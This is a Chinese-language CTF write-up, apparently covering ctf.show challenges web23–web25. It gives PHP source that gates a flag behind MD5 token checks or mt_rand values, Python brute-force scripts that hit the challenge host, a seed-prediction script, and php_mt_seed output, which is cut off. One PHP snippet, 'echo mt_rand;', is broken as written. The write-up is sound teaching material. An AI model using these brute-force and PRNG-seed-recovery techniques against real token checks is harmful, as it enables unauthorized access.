token）</h3><p>题目描述：还爆破？这么多代码，告辞！</p><p>源码中有些不认识的函数：substr ()、intval ()</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">() 函数返回字符串的一部分。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">注释：如果 start 参数是负数且 length 小于或等于 start，则 length 为 </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">语法：substr</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">string</span><span style="color:#d4d4d4">,start,length) </span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">string</span><span style="color:#d4d4d4"> 	必需。规定要返回其中一部分的字符串。</span></span>
<span class="line"><span style="color:#d4d4d4">start 	必需。规定在字符串的何处开始。</span></span>
<span class="line"><span style="color:#d4d4d4">    	正数 - 在字符串的指定位置开始</span></span>
<span class="line"><span style="color:#d4d4d4">    	负数 - 在从字符串结尾的指定位置开始</span></span>
<span class="line"><span style="color:#d4d4d4">    	</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4"> - 在字符串中的第一个字符处开始</span></span>
<span class="line"><span style="color:#d4d4d4">length 	可选。规定要返回的字符串长度。默认是直到字符串的结尾。</span></span>
<span class="line"><span style="color:#d4d4d4">    	正数 - 从 start 参数所在的位置返回</span></span>
<span class="line"><span style="color:#d4d4d4">    	负数 - 从字符串末端返回</span></span>
<span class="line"><span style="color:#d4d4d4">-----------------------------------------------</span></span>
<span class="line"><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">() 函数用于获取变量的整数值。</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">() 函数通过使用指定的进制 base 转换（默认是十进制），返回变量 </span><span style="color:#569cd6">var</span><span style="color:#d4d4d4"> 的 </span><span style="color:#569cd6">integer</span><span style="color:#d4d4d4"> 数值。 </span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">() 不能用于 </span><span style="color:#569cd6">object</span><span style="color:#d4d4d4">，否则会产生 E_NOTICE 错误并返回 </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">。</span></span></code></pre></div></div></figure><p>源码：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'flag.php'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'token'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$token</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">md5</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'token'</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$token</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">)===</span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$token</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">14</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">) &amp;&amp; </span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$token</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">14</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">) ===</span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$token</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">17</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">((</span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$token</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">))+</span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$token</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">14</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">))+</span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$token</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">17</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">))/</span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$token</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">)===</span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$token</span><span style="color:#d4d4d4">, </span><span style="color:#b5cea8">31</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">))){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><p>用 python 编写脚本跑出两位的 token 值，可能还有不止两位的 token 值，但是懒得跑了。</p><figure class="shiki python"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> hashlib</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">a = </span><span style="color:#ce9178">'0123456789abcdefghijklmnopqrstuvwxyz'</span></span>
<span class="line"><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> i </span><span style="color:#c586c0">in</span><span style="color:#d4d4d4"> a:</span></span>
<span class="line"><span style="color:#d4d4d4">	</span><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> j </span><span style="color:#c586c0">in</span><span style="color:#d4d4d4"> a:</span></span>
<span class="line"><span style="color:#d4d4d4">		t = (</span><span style="color:#4ec9b0">str</span><span style="color:#d4d4d4">(i)+</span><span style="color:#4ec9b0">str</span><span style="color:#d4d4d4">(j)).encode(</span><span style="color:#ce9178">'utf-8'</span><span style="color:#d4d4d4">)</span></span>
<span class="line"><span style="color:#d4d4d4">		md5 = hashlib.md5(t).hexdigest()</span></span>
<span class="line"><span style="color:#d4d4d4">		</span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> md5[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">:</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">] == md5[</span><span style="color:#b5cea8">14</span><span style="color:#d4d4d4">:</span><span style="color:#b5cea8">15</span><span style="color:#d4d4d4">] == md5[</span><span style="color:#b5cea8">17</span><span style="color:#d4d4d4">:</span><span style="color:#b5cea8">18</span><span style="color:#d4d4d4">]:</span></span>
<span class="line"><span style="color:#d4d4d4">			</span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#4ec9b0">int</span><span style="color:#d4d4d4">(md5[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">:</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">])+</span><span style="color:#4ec9b0">int</span><span style="color:#d4d4d4">(md5[</span><span style="color:#b5cea8">14</span><span style="color:#d4d4d4">:</span><span style="color:#b5cea8">15</span><span style="color:#d4d4d4">])+</span><span style="color:#4ec9b0">int</span><span style="color:#d4d4d4">(md5[</span><span style="color:#b5cea8">17</span><span style="color:#d4d4d4">:</span><span style="color:#b5cea8">18</span><span style="color:#d4d4d4">]))/</span><span style="color:#4ec9b0">int</span><span style="color:#d4d4d4">(md5[</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">:</span><span style="color:#b5cea8">2</span><span style="color:#d4d4d4">]) == </span><span style="color:#4ec9b0">int</span><span style="color:#d4d4d4">(md5[</span><span style="color:#b5cea8">31</span><span style="color:#d4d4d4">:</span><span style="color:#b5cea8">32</span><span style="color:#d4d4d4">]):</span></span>
<span class="line"><span style="color:#d4d4d4">				</span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(t)</span></span></code></pre></div></div></figure><p>这种题还有一种解法就是返回页面搜查：</p><figure class="shiki python"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#c586c0">import</span><span style="color:#d4d4d4"> requests</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">a = </span><span style="color:#ce9178">"abcdefghijklmnopqrstuvwxyz0123456789"</span></span>
<span class="line"><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> i </span><span style="color:#c586c0">in</span><span style="color:#d4d4d4"> a:</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">for</span><span style="color:#d4d4d4"> j </span><span style="color:#c586c0">in</span><span style="color:#d4d4d4"> a:</span></span>
<span class="line"><span style="color:#d4d4d4">        url =</span><span style="color:#ce9178">"http://5aad3711-167d-4268-94b4-3bb1a93ae1f0.chall.ctf.show：8080?token="</span><span style="color:#d4d4d4">+</span><span style="color:#4ec9b0">str</span><span style="color:#d4d4d4">(i)+</span><span style="color:#4ec9b0">str</span><span style="color:#d4d4d4">(j)</span></span>
<span class="line"><span style="color:#d4d4d4">        req = requests.get(</span><span style="color:#9cdcfe">url</span><span style="color:#d4d4d4">=url).text</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"ctf"</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">in</span><span style="color:#d4d4d4"> req:</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(req)</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">exit</span><span style="color:#d4d4d4">()</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">:</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">print</span><span style="color:#d4d4d4">(url)</span></span>
<span class="line"></span>
<span class="line"><span style="color:#6a9955"># 搜查返回页面是否有ctf 但是此方法爆破较慢</span></span></code></pre></div></div></figure><h3 id="web24脚本编写转换"><a class="markdownIt-Anchor" href="#web24脚本编写转换"></a> web24	(脚本编写转换)</h3><p>题目描述：爆个🔨</p><p>源码中有个函数不认识：</p><p>mt_srand () 函数：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">mt_srand</span><span style="color:#d4d4d4">() 播种 Mersenne Twister 随机数生成器</span></span>
<span class="line"><span style="color:#dcdcaa">语法：mt_srand</span><span style="color:#d4d4d4">(seed)</span></span></code></pre></div></div></figure><p>reference：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/107302795">https://blog.csdn.net/qq_45521281/article/details/107302795</a></p><p>源码：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"><span style="color:#d4d4d4">     </span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'r'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$r</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'r'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">mt_srand</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">372619038</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$r</span><span style="color:#d4d4d4">)===</span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">mt_rand</span><span style="color:#d4d4d4">())){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'cat /proc/version'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">?&gt; Linux version </span><span style="color:#b5cea8">5.4.0</span><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">131</span><span style="color:#d4d4d4">-</span><span style="color:#dcdcaa">generic</span><span style="color:#d4d4d4"> (buildd@lcy02-amd64-</span><span style="color:#b5cea8">108</span><span style="color:#d4d4d4">) (gcc version </span><span style="color:#b5cea8">9.4.0</span><span style="color:#d4d4d4"> (Ubuntu </span><span style="color:#b5cea8">9.4.0</span><span style="color:#d4d4d4">-</span><span style="color:#b5cea8">1</span><span style="color:#d4d4d4">ubuntu1~</span><span style="color:#b5cea8">20.04.1</span><span style="color:#d4d4d4">)) </span><span style="color:#6a9955">#147-Ubuntu SMP Fri Oct 14 17:07:22 UTC 2022 Linux version 5.4.0-131-generic (buildd@lcy02-amd64-108) (gcc version 9.4.0 (Ubuntu 9.4.0-1ubuntu1~20.04.1)) #147-Ubuntu SMP Fri Oct 14 17:07:22 UTC 2022</span></span></code></pre></div></div></figure><p>这道题我们已经知道种子，就不需要去爆破了。直接写出脚本进行转换得到字符串：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#dcdcaa">mt_srand</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">372619038</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> mt_rand;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">result：1155388967</span></span></code></pre></div></div></figure><p>传参：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">http:</span><span style="color:#6a9955">//20e33400-2e34-4833-9e8e-a254f35c924d.challenge.ctf.show/?r=1155388967</span></span></code></pre></div></div></figure><p>flag:</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">ctfshow</span><span style="color:#d4d4d4">{c68f8b8a-a644-4417-800f-6326eb72ef01}</span></span></code></pre></div></div></figure><h3 id="web25php_mt_seed工具爆破筛选"><a class="markdownIt-Anchor" href="#web25php_mt_seed工具爆破筛选"></a> web25	(php_mt_seed 工具爆破筛选)</h3><p>hint：爆个🔨，不爆了</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4"> &lt;?php</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"flag.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'r'</span><span style="color:#d4d4d4">])){</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$r</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$_GET</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'r'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">mt_srand</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">hexdec</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">md5</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">), </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">)));</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#9cdcfe">$rand</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$r</span><span style="color:#d4d4d4">)-</span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">mt_rand</span><span style="color:#d4d4d4">());</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">((!</span><span style="color:#9cdcfe">$rand</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_COOKIE</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'token'</span><span style="color:#d4d4d4">]==(</span><span style="color:#dcdcaa">mt_rand</span><span style="color:#d4d4d4">()+</span><span style="color:#dcdcaa">mt_rand</span><span style="color:#d4d4d4">())){</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$rand</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span><span style="color:#c586c0">else</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">highlight_file</span><span style="color:#d4d4d4">(</span><span style="color:#569cd6">__FILE__</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">system</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">'cat /proc/version'</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span></code></pre></div></div></figure><p>判断关键信息：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">mt_srand</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">hexdec</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">substr</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">md5</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">), </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">,</span><span style="color:#b5cea8">8</span><span style="color:#d4d4d4">)));</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#9cdcfe">$rand</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$r</span><span style="color:#d4d4d4">)-</span><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">mt_rand</span><span style="color:#d4d4d4">());</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">((!</span><span style="color:#9cdcfe">$rand</span><span style="color:#d4d4d4">)){</span></span>
<span class="line"><span style="color:#d4d4d4">       </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_COOKIE</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'token'</span><span style="color:#d4d4d4">]==(</span><span style="color:#dcdcaa">mt_rand</span><span style="color:#d4d4d4">()+</span><span style="color:#dcdcaa">mt_rand</span><span style="color:#d4d4d4">())){</span></span>
<span class="line"><span style="color:#d4d4d4">           </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$flag</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">       }</span></span></code></pre></div></div></figure><p>第一个 if 语句中进行取反，其实就是 <strong>intval($r)</strong> 和 **intval (mt_rand)** 要相等。</p><p>但是也可通过这一个式子得到第一次的随机数（传 r 为空）：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">intval</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">mt_rand</span><span style="color:#d4d4d4">())：2105788890</span></span></code></pre></div></div></figure><p>得到这个第一次的伪随机数之后就能尝试用工具 <strong>php_mt_seed</strong> 去爆破了：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">download：http:</span><span style="color:#6a9955">//www.openwall.com/php_mt_seed</span></span></code></pre></div></div></figure><blockquote><p>它可以根据单次 mt_rand () 的输出结果直接爆破出可能的种子，当然也可以爆破类似 mt_rand (1,100) 这样限定了 MIN MAX 输出的种子。</p></blockquote><p>下载后，执行如下命令编译生成：</p><figure class="shiki php"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#d4d4d4">kali下，进入目录，make</span></span></code></pre></div></div></figure><p>得到爆破可能结果：</p><figure class="shiki bash"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div><div class="code"><pre class="shiki dark-plus"><code><span class="line"><span style="color:#dcdcaa">┌──(kali㉿kali</span><span style="color:#d4d4d4">)-[~/桌面/php_mt_seed_4.0/php_mt_seed-4.0]</span></span>
<span class="line"><span style="color:#dcdcaa">└─$</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">time</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">./php_mt_seed</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">2105788890</span></span>
<span class="line"><span style="color:#dcdcaa">Pattern:</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">EXACT</span></span>
<span class="line"><span style="color:#dcdcaa">Version:</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">3.0</span><span style="color:#ce9178">.7</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">to</span><span style="color:#d4d4d4"> </span><span style="color:#b5cea8">5.2</span><span style="color:#ce9178">.0</span></span>
